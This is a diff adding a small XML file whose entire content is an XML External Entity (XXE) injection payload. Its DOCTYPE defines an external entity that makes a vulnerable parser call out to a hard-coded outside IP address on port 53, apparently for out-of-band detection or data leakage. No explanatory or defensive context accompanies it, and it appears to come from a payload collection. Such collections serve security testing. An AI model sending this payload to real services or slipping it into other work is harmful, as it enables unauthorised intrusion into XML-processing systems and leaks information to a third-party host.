@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="utf-8"?>
+ <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://95.211.198.76:53/gggg" >]><foo>&xxe;</foo>
